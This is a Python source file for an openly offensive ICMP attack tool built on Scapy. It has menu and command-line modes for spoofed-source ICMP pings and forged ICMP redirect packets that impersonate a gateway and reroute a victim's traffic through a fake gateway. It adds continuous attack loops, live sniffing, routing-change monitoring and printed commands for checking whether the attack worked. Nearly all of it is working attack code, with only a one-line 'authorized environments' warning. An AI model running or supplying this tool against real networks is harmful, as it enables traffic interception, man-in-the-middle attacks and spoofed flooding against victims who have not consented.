#!/usr/bin/env python3
"""
ICMP Attack Tool
================

Practical ICMP spoofing and redirect attack tool with real-time monitoring.
Features visual attack indicators and automatic monitoring capabilities.
"""

import sys
import os
import time
import argparse
import threading
import subprocess
from datetime import datetime
from faker import Faker
from colorama import init, Fore, Back, Style

# Import Scapy components
try:
    from scapy.all import (
        IP, ICMP, Ether, ARP, send, sendp, sniff, 
        get_if_list, get_if_addr, conf, sr1
    )
except ImportError:
    print("Error: Scapy not installed. Please run: pip install scapy")
    sys.exit(1)

# Initialize colorama for cross-platform colored output
init(autoreset=True)

class AttackMonitor:
    """Real-time attack monitoring and visualization"""
    
    def __init__(self):
        self.monitoring = False
        self.attack_stats = {
            'packets_sent': 0,
            'redirects_sent': 0,
            'responses_received': 0,
            'routing_changes': 0
        }
    
    def show_attack_banner(self, attack_type):
        """Display attack banner with ASCII art"""
        print(f"\n{Fore.RED}{Style.BRIGHT}")
        if attack_type == "spoof":
            print("███████╗██████╗  ██████╗  ██████╗ ███████╗")
            print("██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝")
            print("███████╗██████╔╝██║   ██║██║   ██║█████╗  ")
            print("╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ")
            print("███████║██║     ╚██████╔╝╚██████╔╝██║     ")
            print("╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ")
            print("           ICMP SPOOFING ATTACK")
        elif attack_type == "redirect":
            print("██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗")
            print("██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝")
            print("██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   ")
            print("██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ")
            print("██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ")
            print("╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   ")
            print("                  ICMP REDIRECT ATTACK")
        print(f"{Style.RESET_ALL}")
    
    def display_live_stats(self):
        """Display live attack statistics"""
        while self.monitoring:
            os.system('clear')
            print(f"{Fore.CYAN}{'='*60}")
            print(f"{Fore.CYAN}             LIVE ATTACK MONITOR")
            print(f"{Fore.CYAN}{'='*60}")
            print(f"{Fore.GREEN} Attack Statistics:")
            print(f"   Packets Sent: {self.attack_stats['packets_sent']}")
            print(f"   Redirects Sent: {self.attack_stats['redirects_sent']}")
            print(f"   Responses Received: {self.attack_stats['responses_received']}")
            print(f"   Routing Changes: {self.attack_stats['routing_changes']}")
            print(f"{Fore.YELLOW} Time: {datetime.now().strftime('%H:%M:%S')}")
            print(f"{Fore.CYAN}{'='*60}")
            time.sleep(1)
    
    def start_monitoring(self):
        """Start real-time monitoring"""
        self.monitoring = True
        monitor_thread = threading.Thread(target=self.display_live_stats)
        monitor_thread.daemon = True
        monitor_thread.start()
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.monitoring = False
        time.sleep(1.5)

class ICMPAttackTool:
    """Main class for ICMP attacks with visual monitoring"""
    
    def __init__(self):
        self.fake = Faker()
        self.monitor = AttackMonitor()
        self.target_routes = {}
        
    def show_banner(self):
        """Display the tool banner"""
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("██╗ ██████╗███╗   ███╗██████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗")
        print("██║██╔════╝████╗ ████║██╔══██╗    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝")
        print("██║██║     ██╔████╔██║██████╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ ")
        print("██║██║     ██║╚██╔╝██║██╔═══╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ")
        print("██║╚██████╗██║ ╚═╝ ██║██║         ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗")
        print("╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")
        print(f"{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚡ Advanced ICMP Attack Tool with Real-time Monitoring")
        print(f"{Fore.RED}⚠️  Use only in authorized environments!")
        print()
    
    def check_permissions(self):
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print(f"{Fore.RED}❌ Error: This tool requires root privileges")
            print(f"{Fore.YELLOW} Please run with: sudo python3 {sys.argv[0]}")
            sys.exit(1)
    
    def capture_initial_routes(self, target_ip):
        """Capture initial routing information"""
        try:
            result = subprocess.run(['ip', 'route', 'get', target_ip], 
                                  capture_output=True, text=True, check=True)
            self.target_routes[target_ip] = result.stdout.strip()
            return True
        except:
            return False
    
    def monitor_routing_changes(self, target_ip, duration=30):
        """Monitor for routing table changes"""
        print(f"{Fore.CYAN}👁️  Monitoring routing changes for {target_ip}...")
        
        for i in range(duration):
            try:
                result = subprocess.run(['ip', 'route', 'get', target_ip], 
                                      capture_output=True, text=True, check=True)
                current_route = result.stdout.strip()
                
                if target_ip in self.target_routes:
                    if current_route != self.target_routes[target_ip]:
                        print(f"{Fore.GREEN}🔄 ROUTING CHANGE DETECTED!")
                        print(f"   Old: {self.target_routes[target_ip]}")
                        print(f"   New: {current_route}")
                        self.monitor.attack_stats['routing_changes'] += 1
                        self.target_routes[target_ip] = current_route
                
                time.sleep(1)
            except:
                pass
    
    def packet_sniffer(self, filter_str, duration=30):
        """Real-time packet capture with visual indicators"""
        def packet_handler(packet):
            if packet.haslayer(ICMP):
                icmp_type = packet[ICMP].type
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if icmp_type == 5:  # ICMP Redirect
                    print(f"{Fore.RED} REDIRECT DETECTED: {src_ip} → {dst_ip}")
                    self.monitor.attack_stats['responses_received'] += 1
                elif icmp_type == 0:  # ICMP Reply
                    print(f"{Fore.GREEN} PING REPLY: {src_ip} → {dst_ip}")
                    self.monitor.attack_stats['responses_received'] += 1
                elif icmp_type == 8:  # ICMP Request
                    print(f"{Fore.BLUE} PING REQUEST: {src_ip} → {dst_ip}")
        
        print(f"{Fore.CYAN}🔍 Starting packet capture...")
        sniff(filter=filter_str, prn=packet_handler, timeout=duration)
    
    def icmp_spoof_attack(self, target_ip, source_ip=None, count=5, delay=1):
        """Enhanced ICMP spoofing attack with monitoring"""
        self.monitor.show_attack_banner("spoof")
        
        if not source_ip:
            source_ip = self.fake.ipv4()
        
        print(f"{Fore.MAGENTA} Target: {target_ip}")
        print(f"{Fore.MAGENTA} Spoofed Source: {source_ip}")
        print(f"{Fore.MAGENTA} Count: {count}")
        print()
        
        # Start monitoring
        self.monitor.start_monitoring()
        
        # Start packet capture in background
        capture_thread = threading.Thread(
            target=self.packet_sniffer, 
            args=("icmp", count * delay + 10)
        )
        capture_thread.daemon = True
        capture_thread.start()
        
        try:
            for i in range(count):
                packet = IP(src=source_ip, dst=target_ip) / ICMP(type=8, code=0)
                send(packet, verbose=0)
                self.monitor.attack_stats['packets_sent'] += 1
                
                if i < count - 1:
                    time.sleep(delay)
            
            # Wait for responses
            time.sleep(5)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  Attack interrupted!")
        finally:
            self.monitor.stop_monitoring()
        
        print(f"\n{Fore.GREEN}✅ ICMP spoofing attack completed!")
        self.show_attack_summary()
    
    def icmp_redirect_attack(self, victim_ip, target_ip, gateway_ip, fake_gateway_ip=None):
        """Enhanced ICMP redirect attack with full monitoring"""
        self.monitor.show_attack_banner("redirect")
        
        if not fake_gateway_ip:
            fake_gateway_ip = self.fake.ipv4()
        
        print(f"{Fore.MAGENTA} Victim: {victim_ip}")
        print(f"{Fore.MAGENTA} Target: {target_ip}")
        print(f"{Fore.MAGENTA} Gateway: {gateway_ip}")
        print(f"{Fore.MAGENTA} Fake Gateway: {fake_gateway_ip}")
        print()
        
        # Capture initial routing state
        self.capture_initial_routes(target_ip)
        
        # Start monitoring
        self.monitor.start_monitoring()
        
        # Start packet capture
        capture_thread = threading.Thread(
            target=self.packet_sniffer, 
            args=("icmp", 60)
        )
        capture_thread.daemon = True
        capture_thread.start()
        
        # Start routing monitor
        route_thread = threading.Thread(
            target=self.monitor_routing_changes,
            args=(target_ip, 60)
        )
        route_thread.daemon = True
        route_thread.start()
        
        try:
            # Send redirect packet
            inner_packet = IP(src=victim_ip, dst=target_ip) / ICMP()
            redirect_packet = (
                IP(src=gateway_ip, dst=victim_ip) /
                ICMP(type=5, code=1, gw=fake_gateway_ip) /
                inner_packet
            )
            
            print(f"{Fore.RED}🚀 Sending ICMP redirect...")
            send(redirect_packet, verbose=0)
            self.monitor.attack_stats['redirects_sent'] += 1
            
            print(f"{Fore.GREEN}✅ Redirect packet sent!")
            
            # Monitor for 30 seconds
            print(f"{Fore.CYAN} Monitoring for effects...")
            time.sleep(30)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  Attack interrupted!")
        finally:
            self.monitor.stop_monitoring()
        
        print(f"\n{Fore.GREEN}✅ ICMP redirect attack completed!")
        self.show_attack_summary()
        self.show_verification_commands(victim_ip, target_ip, fake_gateway_ip)
    
    def show_attack_summary(self):
        """Display final attack statistics"""
        stats = self.monitor.attack_stats
        print(f"\n{Fore.CYAN} ATTACK SUMMARY")
        print("=" * 40)
        print(f" Total packets sent: {stats['packets_sent']}")
        print(f" Redirects sent: {stats['redirects_sent']}")
        print(f" Responses captured: {stats['responses_received']}")
        print(f" Routing changes detected: {stats['routing_changes']}")
        print("=" * 40)
    
    def show_verification_commands(self, victim_ip, target_ip, fake_gateway_ip):
        """Show commands to verify attack success"""
        print(f"\n{Fore.YELLOW}🔍 VERIFICATION COMMANDS")
        print("=" * 50)
        print(f"On victim machine ({victim_ip}):")
        print(f"  ip route show | grep {target_ip}")
        print(f"  ping -c 3 {target_ip}")
        print(f"  traceroute {target_ip}")
        print()
        print(f"On attacker machine:")
        print(f"  sudo tcpdump -i any host {victim_ip}")
        print(f"  sudo tcpdump -i any host {fake_gateway_ip}")
        print("=" * 50)
    
    def continuous_attack_mode(self, attack_type, **kwargs):
        """Continuous attack mode with real-time monitoring"""
        print(f"{Fore.RED} CONTINUOUS ATTACK MODE ACTIVATED")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop...")
        
        self.monitor.start_monitoring()
        
        try:
            while True:
                if attack_type == "spoof":
                    self.icmp_spoof_attack(count=1, delay=2, **kwargs)
                elif attack_type == "redirect":
                    self.icmp_redirect_attack(**kwargs)
                    time.sleep(10)  # Wait between redirect attempts
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  Continuous attack stopped!")
        finally:
            self.monitor.stop_monitoring()
    
    def show_main_menu(self):
        """Display the main menu"""
        print(f"\n{Fore.CYAN}⚡ ICMP ATTACK TOOL - MAIN MENU")
        print("=" * 40)
        print(f"{Fore.GREEN}1.{Style.RESET_ALL} ICMP Spoofing Attack")
        print(f"{Fore.GREEN}2.{Style.RESET_ALL} ICMP Redirect Attack")
        print(f"{Fore.GREEN}3.{Style.RESET_ALL} Continuous Attack Mode")
        print(f"{Fore.GREEN}4.{Style.RESET_ALL} Live Network Monitor")
        print(f"{Fore.GREEN}5.{Style.RESET_ALL} Exit")
        print("-" * 40)
    
    def live_network_monitor(self):
        """Live network monitoring mode"""
        print(f"{Fore.CYAN} LIVE NETWORK MONITOR")
        print("=" * 30)
        print("Monitoring all ICMP traffic...")
        print("Press Ctrl+C to stop")
        print()
        
        try:
            self.packet_sniffer("icmp", duration=0)  # Infinite monitoring
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}  Monitoring stopped!")
    
    def run_interactive_mode(self):
        """Run the tool in interactive mode"""
        self.show_banner()
        self.check_permissions()
        
        while True:
            self.show_main_menu()
            choice = input(f"{Fore.YELLOW}Select option (1-5): {Style.RESET_ALL}")
            
            if choice == '1':
                # ICMP Spoofing Attack
                print(f"\n{Fore.CYAN} ICMP SPOOFING CONFIGURATION")
                target = input("Target IP: ")
                source = input("Source IP (empty for random): ") or None
                count = int(input("Packet count (default 5): ") or 5)
                delay = float(input("Delay between packets (default 1s): ") or 1)
                
                self.icmp_spoof_attack(target, source, count, delay)
            
            elif choice == '2':
                # ICMP Redirect Attack
                print(f"\n{Fore.CYAN} ICMP REDIRECT CONFIGURATION")
                victim = input("Victim IP: ")
                target = input("Target IP: ")
                gateway = input("Gateway IP: ")
                fake_gw = input("Fake gateway IP (empty for random): ") or None
                
                self.icmp_redirect_attack(victim, target, gateway, fake_gw)
            
            elif choice == '3':
                # Continuous Attack Mode
                print(f"\n{Fore.CYAN} CONTINUOUS ATTACK MODE")
                print("1. Continuous ICMP Spoofing")
                print("2. Continuous ICMP Redirect")
                
                sub_choice = input("Select mode (1-2): ")
                if sub_choice == '1':
                    target = input("Target IP: ")
                    source = input("Source IP (empty for random): ") or None
                    self.continuous_attack_mode("spoof", target_ip=target, source_ip=source)
                elif sub_choice == '2':
                    victim = input("Victim IP: ")
                    target = input("Target IP: ")
                    gateway = input("Gateway IP: ")
                    fake_gw = input("Fake gateway IP (empty for random): ") or None
                    self.continuous_attack_mode("redirect", 
                                               victim_ip=victim, target_ip=target, 
                                               gateway_ip=gateway, fake_gateway_ip=fake_gw)
            
            elif choice == '4':
                # Live Network Monitor
                self.live_network_monitor()
            
            elif choice == '5':
                # Exit
                print(f"{Fore.GREEN} Attack session terminated.")
                break
            
            else:
                print(f"{Fore.RED}Invalid option. Please select 1-5.")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Advanced ICMP Attack Tool with Real-time Monitoring"
    )
    
    parser.add_argument('--target', help='Target IP address')
    parser.add_argument('--source', help='Source IP address to spoof')
    parser.add_argument('--victim', help='Victim IP for redirect attack')
    parser.add_argument('--gateway', help='Gateway IP for redirect attack')
    parser.add_argument('--fake-gateway', help='Fake gateway IP')
    parser.add_argument('--type', choices=['spoof', 'redirect'], help='Attack type')
    parser.add_argument('--count', type=int, default=5, help='Number of packets')
    parser.add_argument('--continuous', action='store_true', help='Continuous attack mode')
    parser.add_argument('--monitor', action='store_true', help='Network monitor only')
    
    args = parser.parse_args()
    
    tool = ICMPAttackTool()
    
    if args.monitor:
        tool.show_banner()
        tool.check_permissions()
        tool.live_network_monitor()
    elif args.target and args.type:
        tool.show_banner()
        tool.check_permissions()
        
        if args.type == 'spoof':
            if args.continuous:
                tool.continuous_attack_mode('spoof', target_ip=args.target, source_ip=args.source)
            else:
                tool.icmp_spoof_attack(args.target, args.source, args.count)
        elif args.type == 'redirect' and args.victim and args.gateway:
            if args.continuous:
                tool.continuous_attack_mode('redirect', 
                                           victim_ip=args.victim, target_ip=args.target,
                                           gateway_ip=args.gateway, fake_gateway_ip=args.fake_gateway)
            else:
                tool.icmp_redirect_attack(args.victim, args.target, args.gateway, args.fake_gateway)
    else:
        tool.run_interactive_mode()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}  Attack terminated by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}")
        sys.exit(1) 